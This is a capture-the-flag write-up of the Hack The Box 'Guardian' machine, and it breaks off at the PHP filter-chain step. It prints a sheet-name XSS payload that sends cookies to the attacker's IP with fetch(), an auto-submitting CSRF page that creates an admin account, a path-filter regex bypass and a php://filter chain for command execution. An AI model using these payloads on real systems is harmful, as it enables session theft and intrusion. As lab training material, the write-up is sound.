---
title: Guardian [Hard]
date: 2025-09-03
tags: [htb, linux, nmap, subdomain, fuzzing, idor, gitea, cve-2025-22131, excel, csrf, lfi, rce, mysql, password cracking, php filter wrapper, regex, hijacking, penelope, apache config, safeapache2ctl, hashcat]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/guardian-htb-release-area-machine
image: /assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_banner.png
---

# Guardian HTB Release Area Machine
## Machine information
Author: [sl1de](https://app.hackthebox.com/users/1187088)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.150.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 00:06 EDT
Nmap scan report for 10.129.150.76
Host is up (1.6s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://guardian.htb/
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.50 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.150.76     guardian.htb
```

Let's check the web server.

### Web Enumeration
Go to `http://guardian.htb`.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website.png)

When hover to `Student Portal`, we got another subdomain.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-student-portal.png)

We gonna update `/etc/hosts` file:
```bash
10.129.150.76     guardian.htb portal.guardian.htb
```

Then we access to `http://portal.guardian.htb`.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-student-portal-2.png)

It said that does not exist. So we continue recon more around the website.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-student-portal-3.png)

Found out some email and users name in the `Student Testimonials` part.

- `GU0142023@guardian.htb` (Boone Basden)
- `GU6262023@guardian.htb` (Jamesy Currin)
- `GU0702025@guardian.htb` (Stephenie Vernau)

Leave this one as a note for later post exploitation. <br>
Now we will fuzzing the `portal.guardian.htb` to see if there is any other endpoints.

### Subdomain Fuzzing & PDF Leak & Discovery
We are using [dirsearch](https://github.com/maurosoria/dirsearch) for this.

```bash
└─$ dirsearch -u http://portal.guardian.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB_Labs/Release_Arena_Machine/Guardian/reports/http_portal.guardian.htb/__25-08-31_00-35-27.txt

Target: http://portal.guardian.htb/

[00:35:27] Starting: 
[00:36:30] 403 -  284B  - /.env                                             
[00:36:44] 403 -  284B  - /.git/                                            
[00:36:44] 403 -  284B  - /.git.json
[00:36:44] 403 -  284B  - /.git
[00:36:44] 403 -  284B  - /.git-credentials                                 
[00:36:44] 403 -  284B  - /.git/config                                      
[00:36:44] 403 -  284B  - /.git/COMMIT_EDITMSG
[00:36:44] 403 -  284B  - /.git/HEAD
[00:36:44] 403 -  284B  - /.git/description                                 
[00:36:44] 403 -  284B  - /.git/branches/
[00:36:44] 403 -  284B  - /.git/FETCH_HEAD                                  
[00:36:44] 403 -  284B  - /.git/head
[00:36:44] 403 -  284B  - /.git-rewrite/
[00:36:44] 403 -  284B  - /.git/hooks/
[00:36:44] 403 -  284B  - /.git/hooks/applypatch-msg
[00:36:44] 403 -  284B  - /.git/hooks/post-update
[00:36:44] 403 -  284B  - /.git/hooks/commit-msg
[00:36:44] 403 -  284B  - /.git/hooks/pre-applypatch
[00:36:44] 403 -  284B  - /.git/hooks/pre-commit
[00:36:44] 403 -  284B  - /.git/hooks/pre-rebase
[00:36:44] 403 -  284B  - /.git/info/
[00:36:44] 403 -  284B  - /.git/hooks/prepare-commit-msg
[00:36:44] 403 -  284B  - /.git/hooks/pre-receive
[00:36:44] 403 -  284B  - /.git/index
[00:36:44] 403 -  284B  - /.git/logs/
[00:36:44] 403 -  284B  - /.git/hooks/pre-push
[00:36:44] 403 -  284B  - /.git/hooks/update
[00:36:44] 403 -  284B  - /.git/logs/HEAD
[00:36:44] 403 -  284B  - /.git/info/exclude
[00:36:44] 403 -  284B  - /.git/info/attributes
[00:36:44] 403 -  284B  - /.git/info/refs
[00:36:44] 403 -  284B  - /.git/logs/head
[00:36:44] 403 -  284B  - /.git/logs/refs
[00:36:44] 403 -  284B  - /.git/logs/refs/heads
[00:36:44] 403 -  284B  - /.git/logs/refs/heads/master
[00:36:44] 403 -  284B  - /.git/logs/refs/remotes
[00:36:44] 403 -  284B  - /.git/logs/refs/remotes/origin
[00:36:44] 403 -  284B  - /.git/logs/refs/remotes/origin/master
[00:36:44] 403 -  284B  - /.git/logs/refs/remotes/origin/HEAD
[00:36:44] 403 -  284B  - /.git/packed-refs
[00:36:44] 403 -  284B  - /.git/objects/
[00:36:44] 403 -  284B  - /.git/refs/
[00:36:44] 403 -  284B  - /.git/objects/info/packs
[00:36:45] 403 -  284B  - /.git2/
[00:36:45] 403 -  284B  - /.github/workflows/docker.yml
[00:36:45] 403 -  284B  - /.github/workflows/nodejs.yml
[00:36:45] 403 -  284B  - /.github/workflows/master.yml
[00:36:45] 403 -  284B  - /.git/refs/remotes
[00:36:45] 403 -  284B  - /.github/workflows/maven.yml
[00:36:45] 403 -  284B  - /.github/workflows/publish.yml
[00:36:45] 403 -  284B  - /.git/refs/heads/master
[00:36:45] 403 -  284B  - /.github/workflows/dependabot.yml
[00:36:45] 403 -  284B  - /.github/workflows/ci.yml
[00:36:45] 403 -  284B  - /.git/refs/remotes/origin
[00:36:45] 403 -  284B  - /.git_release
[00:36:45] 403 -  284B  - /.gitattributes
[00:36:45] 403 -  284B  - /.git/refs/heads
[00:36:45] 403 -  284B  - /.gitignore.orig
[00:36:45] 403 -  284B  - /.git/refs/remotes/origin/master
[00:36:45] 403 -  284B  - /.git/refs/remotes/origin/HEAD
[00:36:45] 403 -  284B  - /.github/
[00:36:45] 403 -  284B  - /.gitconfig
[00:36:45] 403 -  284B  - /.git/refs/tags
[00:36:45] 403 -  284B  - /.github/ISSUE_TEMPLATE.md
[00:36:45] 403 -  284B  - /.github/PULL_REQUEST_TEMPLATE.md
[00:36:45] 403 -  284B  - /.gitchangelog.rc
[00:36:45] 403 -  284B  - /.gitignore
[00:36:45] 403 -  284B  - /.github/workflows/blank.yml
[00:36:48] 403 -  284B  - /.gitmodules
[00:36:48] 403 -  284B  - /.gitignore/
[00:36:48] 403 -  284B  - /.gitignore.swp
[00:36:48] 403 -  284B  - /.gitlab-ci.yml                                   
[00:36:48] 403 -  284B  - /.gitlab/route-map.yml                            
[00:36:48] 403 -  284B  - /.gitlab                                          
[00:36:48] 403 -  284B  - /.gitk
[00:36:48] 403 -  284B  - /.gitlab-ci/.env                                  
[00:36:48] 403 -  284B  - /.gitlab/merge_request_templates
[00:36:48] 403 -  284B  - /.gitreview                                       
[00:36:48] 403 -  284B  - /.gitkeep
[00:36:48] 403 -  284B  - /.gitignore~
[00:36:48] 403 -  284B  - /.gitlab/issue_templates                          
[00:36:48] 403 -  284B  - /.gitlab-ci.off.yml                               
[00:36:48] 403 -  284B  - /.gitignore_global
[00:36:52] 403 -  284B  - /.ht_wsr.txt                                      
[00:36:52] 403 -  284B  - /.htaccess.bak1                                   
[00:36:52] 403 -  284B  - /.htaccess.sample
[00:36:52] 403 -  284B  - /.htaccess_orig
[00:36:52] 403 -  284B  - /.htaccess.orig
[00:36:52] 403 -  284B  - /.htaccess.save                                   
[00:36:52] 403 -  284B  - /.htaccess_extra                                  
[00:36:55] 403 -  284B  - /.htaccess_sc
[00:36:55] 403 -  284B  - /.html                                            
[00:36:55] 403 -  284B  - /.htaccessOLD2                                    
[00:36:55] 403 -  284B  - /.htaccessBAK
[00:36:56] 403 -  284B  - /.htpasswd_test                                   
[00:36:56] 403 -  284B  - /.httr-oauth                                      
[00:36:56] 403 -  284B  - /.htm                                             
[00:36:56] 403 -  284B  - /.htpasswds                                       
[00:36:56] 403 -  284B  - /.htaccessOLD                                     
[00:37:22] 403 -  284B  - /.php                                             
[00:39:14] 301 -  326B  - /admin  ->  http://portal.guardian.htb/admin/     
[00:42:08] 403 -  284B  - /cgi-bin/                                         
[00:42:42] 403 -  284B  - /composer.lock                                    
[00:42:42] 403 -  284B  - /composer.json                                    
[00:42:42] 301 -  327B  - /config  ->  http://portal.guardian.htb/config/   
[00:42:47] 403 -  284B  - /config/                                          
[00:45:41] 301 -  329B  - /includes  ->  http://portal.guardian.htb/includes/
[00:45:41] 403 -  284B  - /includes/
[00:45:57] 301 -  331B  - /javascript  ->  http://portal.guardian.htb/javascript/
[00:46:30] 200 -    1KB - /login.php                                        
[00:48:34] 403 -  284B  - /php5.fcgi                                        
[00:50:14] 403 -  284B  - /server-status                                    
[00:50:14] 403 -  284B  - /server-status/                                   
[00:50:58] 301 -  327B  - /static  ->  http://portal.guardian.htb/static/   
[00:52:13] 403 -  284B  - /vendor/                                          
[00:52:13] 200 -    0B  - /vendor/composer/autoload_namespaces.php          
[00:52:13] 200 -    1KB - /vendor/composer/LICENSE
[00:52:13] 200 -    0B  - /vendor/composer/ClassLoader.php
[00:52:13] 200 -    0B  - /vendor/composer/autoload_static.php
[00:52:13] 200 -    0B  - /vendor/composer/autoload_real.php
[00:52:13] 200 -    0B  - /vendor/composer/autoload_psr4.php
[00:52:13] 200 -    0B  - /vendor/composer/autoload_classmap.php
[00:52:13] 200 -    0B  - /vendor/autoload.php
[00:52:14] 200 -   25KB - /vendor/composer/installed.json                   
                                                                             
Task Completed
```

Found out there is `/admin` endpoint but we can not access straight away but we got the `/login.php` where we can roll back to the email and users we found earlier to login. <br>
&rarr; The thing is we do not have password yet.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login.png)

But if we take a closer look, we can see on the top right corner, there is a `Portal Guide` with a link.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-2.png)

It was a pdf file, let's check it out.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-3.png)

We found out the default password is `GU1234` but we got 3 emails, let's try with each of them as the amount of emails is not a lot.
&rarr; This one `GU0142023@guardian.htb` (Boone Basden) is the valid one.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-4.png)

Now we are in the student portal, there is more endpoints and functions that we can recon around and take a look.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-5.png)

For `My Courses`, we can click to `View Assignments` and `View Grades`.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-6.png)

There is nothing we can do at `Grades` part so let's move on to `Assignments` part.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-7.png)

For the assignments belong to `GU0142023` user, we can see there is two but it got `Overdue` status. <br>
&rarr; Let's click `View Details` to see if we can able to view this assignment.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-8.png)

So as we expected, this assignment is too long like more then 190 days ago, then we got redirected back to the same page but got more assignments.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-9.png)

We notice that there is a `Statistics in Business` assignment belong to `Business Statistics` course with `Upcoming` status. <br>
&rarr; Let's check it out.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-10.png)

For the submission, we need to upload files that end with `.docx` or `.xlsx`. <br>
&rarr; What we thinking that this function is potiential that we can manipulate the file type to execute our malcious code. So we gonna leave it aside and check out rest of the function.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-11.png)

We see two chat session from `GU6262023` and `mireielle.feek`, there is also a `New Chat` button where we can select what user we want to chat with.

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-12.png)

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-13.png)

We choose admin to chat with, we can see from the url that we are id `13` and we are chatting with id `1` which is admin. <br>
From here, we are assume that what if we change our id to other user, there may be chance for us to read the other chat session between other user with admin. <br>
&rarr; Let's intercept this request with burp and then manipulate the `chat_users[0]` one.

### IDOR

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-14.png)

Changing the id from `13` to `2` and we can see the chat session between `jamil.enockson` and admin. <br>
Found out the admin give the password for gitea which was `DHsNnk3V503`. <br>
&rarr; We gonna update `/etc/hosts` file.

```bash
10.129.150.76     guardian.htb portal.guardian.htb gitea.guardian.htb
```

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-15.png)

![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-16.png)

For the `Notice Board` and `Profile` section, there is nothing to consider as much but when we can leverage to high role, need to double check these part as they may got some function that only belong to specific role.

Let's check out the `gitea` one.

### Gitea
Go to `gitea.guardian.htb`.

![Guardian Gitea](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_gitea.png)

Let's login, as we know that we got password for gitea from `jamil.enockson` chat sesssion with admin, chance can be the password is for this user too. <br>
&rarr; Gonna give it a try.

![Guardian Gitea Login](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_gitea-login.png)

![Guardian Gitea Dashboard](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_gitea-dashboard.png)

So we are in `jamil.enockson` as this one is a private account and we notice that this user work with admin in two repos, we can see admin doing some git push and git branch for last month.

![Guardian Gitea Repo](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_gitea-repo.png)

We gonna work with `portal.guardian.htb` repo as this one got more things to discovery behind.

![Guardian Gitea Portal Repo](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_gitea-portal-repo.png)

Let's check out the `composer.json` as this file contains the depedencies.

![Guardian Gitea Composer](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_gitea-composer.png)

We got the version of `phpoffice/phpspreadsheet` is `3.7.0` and `phpoffice/phpword` is `^1.3`. <br>
&rarr; Then we search for related vulnerabilites and take a look at this [phpoffice/phpspreadsheet vulnerabilities](https://security.snyk.io/package/composer/phpoffice%2Fphpspreadsheet) and look for the vulnerable version and got this one [SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746](https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746) with [CVE-2025-22131](https://www.cve.org/CVERecord?id=CVE-2025-22131).

### CVE-2025-22131
Take a look at security advisories [Cross-Site Scripting (XSS) vulnerability in generateNavigation() function](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx). Read through the summary and know that this was a zero day xss when translate `.xlsx` file to `.html` response representation. <br>
It only provide `Poc` to this cve, we gonna adapt this to our machine challenge.

First we need to create a xlsx file with multiple sheets and then gonna change 1 sheet name to `"><img src=x onerror=alert(1)>`. <br>
For this step, we can try manually or we can use this [FSheet](https://www.treegrid.com/FSheet) with online Excel sheet so we rename the sheet and export to use it which way for faster.

![Guardian Excel Sheet Name](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_excel-sheet-name.png)

We gonna use this payload `"><img src=x onerror=fetch("http://10.10.16.36/?c="+document.cookie)>` in order to grab the lecturer cookie to escalate them.

![Guardian Excel Export](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_excel-export.png)

Then we will export the file.

![Guardian Excel File](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_excel-file.png)

Setup our python on kali to capture the request.

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Back to the assignment submission, name the title and upload the file.

![Guardian Excel Upload](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_excel-upload.png)

Wait for few second.

![Guardian Excel Exploit](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_excel-exploit.png)

Got `PHPSESSID=h6e2ci6666q81bvt3mvmm79jsi`, we will inject this new cookie via Dev Tools.

![Guardian Dev Tools](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_dev_tools.png)

Now refresh the page.

![Guardian Lecturer Dashboard](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-dashboard.png)

We are in `sammy.treat` as this user role is lecturer.

![Guardian Lecturer Profile](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-profile.png)

Checking back some section and we found out that.

![Guardian Lecturer Create Notice](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-create-notice.png)

We can see that there is a `Create Notice` button as we can not see as a student role before. <br>
&rarr; Let's take a look at it.

![Guardian Lecturer Create Notice](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-create-notice-1.png)

Notice that the `Reference Link` will be review by admin, so let's setup our python server and put our ip in to see if admin gonna click and review it.

![Guardian Lecturer Create Notice](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-create-notice-2.png)

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![Guardian Lecturer Create Notice](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-create-notice-3.png)

After click `Create Notice`, there will be a pop out waiting for approval from admin.

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.150.76 - - [31/Aug/2025 11:03:25] "GET / HTTP/1.1" 200 -
10.129.150.76 - - [31/Aug/2025 11:03:28] code 404, message File not found
10.129.150.76 - - [31/Aug/2025 11:03:28] "GET /favicon.ico HTTP/1.1" 404 -
```

Wait for few second and admin click our link to review and we got the request back. <br>
&rarr; Let's check the request from burpsuite.

![Guardian Lecturer Create Notice Request](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-create-notice-request.png)

We see there is `csrf_token` parameter, checking the source code we also found a `csrf-tokens.php` in `/config`.

![Guardian Lecturer CSRF Source Code](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-csrf-source-code.png)

From this point, we thinking that what if we maninuplate the link and take the csrf token to let admin preview and execute our malicious code to do something. <br>
We take a brief in `/admin` and found out we can leverage `createuser.php` to let's admin create a user with admin so that we can login as other user with admin role.

![Guardian Lecturer Admin Source Code](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-admin-source-code.png)

```php
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $csrf_token = $_POST['csrf_token'] ?? '';

    if (!is_valid_token($csrf_token)) {
        die("Invalid CSRF token!");
    }

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';

    // Check for empty fields
    if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role
        ];

        if ($userModel->create($data)) {
            header('Location: /admin/users.php?created=true');
            exit();
        } else {
            $error = "Failed to create user. Please try again.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create User - Admin Dashboard</title>
    <link href="../static/vendor/tailwindcss/tailwind.min.css" rel="stylesheet">
    <link href="../static/styles/icons.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            height: 100vh;
            overflow: hidden;
        }

        .sidebar {
            flex-shrink: 0;
            width: 15rem;
            background-color: #1a202c;
            color: white;
        }

        .main-content {
            flex: 1;
            overflow-y: auto;
        }
    </style>
</head>

<body class="bg-gray-100">
    <div class="sidebar">
        <!-- Include Admin Sidebar -->
        <?php include '../includes/admin/sidebar.php'; ?>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <nav class="bg-white shadow-sm">
            <div class="mx-6 py-4">
                <h1 class="text-2xl font-semibold text-gray-800">Create New User</h1>
            </div>
        </nav>

        <div class="p-6">
            <div class="bg-white rounded-lg shadow p-6">
                <?php if (isset($error)): ?>
                    <div class="bg-red-100 text-red-700 p-4 rounded mb-4">
                        <?php echo htmlspecialchars($error); ?>
                    </div>
                <?php endif; ?>
                <form method="POST" class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Username</label>
                        <input type="text" name="username" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Password</label>
                        <input type="password" name="password" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Full Name</label>
                        <input type="text" name="full_name" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Email</label>
                        <input type="email" name="email" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Date of Birth (YYYY-MM-DD)</label>
                        <input type="date" name="dob" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Address</label>
                        <textarea name="address" rows="3" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500"></textarea>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">User Role</label>
                        <select name="user_role" required
                            class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
                            <option value="student">Student</option>
                            <option value="lecturer">Lecturer</option>
                            <option value="admin">Admin</option>
                        </select>
                    </div>
                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($token) ?>">
                    <div class="flex justify-end">
                        <button type="submit" class="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700">
                            Create User
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>

</html>
```

Let's exploit it out.

### CSRF
So to create a CSRF POC, there are plenty of way, if we are burp pro, we can use extension from it and if not, we can use from this [csrfshark](https://csrfshark.github.io/app/) that it will create a csrf based on our request.

![Guardian Lecturer CSRFSHARK](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-csrfshark.png)

Then we will modified to suitable with the `createuser.php` and save as `csrf.html`.

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Form exploit</title>
		<style>
			body { font-family: Arial, sans-serif; margin: 20px; }
			form { max-width: 400px; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
			input, select { width: 100%; margin: 10px 0; padding: 5px; }
			button { background-color: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; }
			button:hover { background-color: #45a049; }
		</style>
	</head>
	<body>
		<h1>Form</h1>
		<form method="POST" action="http://portal.guardian.htb/admin/createuser.php" id="Form">
			<input type="hidden" name="csrf_token" value="dfdafd3178921588c6b68e17543b34d3">
			<input type="hidden" name="username" value="2fa0n">
        	<input type="hidden" name="password" value="pass@123">
        	<input type="hidden" name="full_name" value="2fa0nhtb">
        	<input type="hidden" name="email" value="2fa0n@guardian.htb">
        	<input type="hidden" name="dob" value="2025-09-01">
        	<input type="hidden" name="address" value="Admin Address">
        	<input type="hidden" name="user_role" value="admin">
        	<button type="submit">Create Admin Account</button>
		</form>
		
		<script>
        window.onload = function() {
            document.getElementById('Form').submit();
        };
    </script>
	</body>
</html>
```

Now setup our server.

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Create new notice with our new link.

![Guardian Lecturer Create Notice](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_lecturer-create-notice-4.png)

Hold the breath for few second.

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.150.76 - - [31/Aug/2025 11:24:09] "GET /csrf.html HTTP/1.1" 200 -
10.129.150.76 - - [31/Aug/2025 11:24:10] code 404, message File not found
10.129.150.76 - - [31/Aug/2025 11:24:10] "GET /favicon.ico HTTP/1.1" 404 -
```

Admin has review our link and as the flow, our new account `2fa0n` has been created. <br>
&rarr; Let's sign out and login as `2fa0n`.

![Guardian Admin](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin.png)

There we go, we are in as an admin, review again some feature is there is some extra.

![Guardian Admin Reports](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-reports.png)

We found out a report section that we can that when we click on a report, it will provide details chart about it.

![Guardian Admin Reports](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-reports-1.png)

What hits our eyes is this url `http://portal.guardian.htb/admin/reports.php?report=reports/enrollment.php` that it read the absolute path from the server. <br>
&rarr; Let's try path traversal if we can read the `config.php` from `/config`.

![Guardian Admin Reports](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-reports-2.png)

We got blocked, let's review the source code.

![Guardian Admin Reports](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-reports-3.png)

```php
if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}
```

As from what we see, it got filter out and also got regex in case we can bypass the `..`, we still can not access the file. <br>
What if we use `,` that and then add these `enrollment|academic|financial|system` end with `.php` <br>
&rarr; Will it bypass the regex?

### Bypass Regex
The orginal path is gonna be like these: `/var/www/html/config/db.php/`.
This one is after adding `,system.php` at the end: `/var/www/html/config/db.php/,system.php`

![Guardian Admin Reports](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-reports-4.png)

We do not get `Access denied` any more but we can not see the content of the `db.php` file. <br>
&rarr; Take some research and got [Local File Inclusion to Remote Code Execution (RCE)](https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a) where we will use the concept of `php://filter wrapper` to exploit this.

### LFI to RCE
So we gonna try the base64 that it will encode the data then we will copy and decode that out.

```bash
/admin/reports.php?report=php://filter/convert.base64-encode/resource=/etc/passwd/,system.php
```

![Guardian Admin Reports](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-reports-5.png)

Got `200` but we can not see the data that has been encoded. <br>
&rarr; Continue reading the article and found out [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) so we gonna try it out.

We want to know the `id` so we will chain with this payload `<?php system("id");?>`.

```bash
└─$ python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
[+] The following gadget chain will generate the following code : <?php system("id");?> (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOz8+)
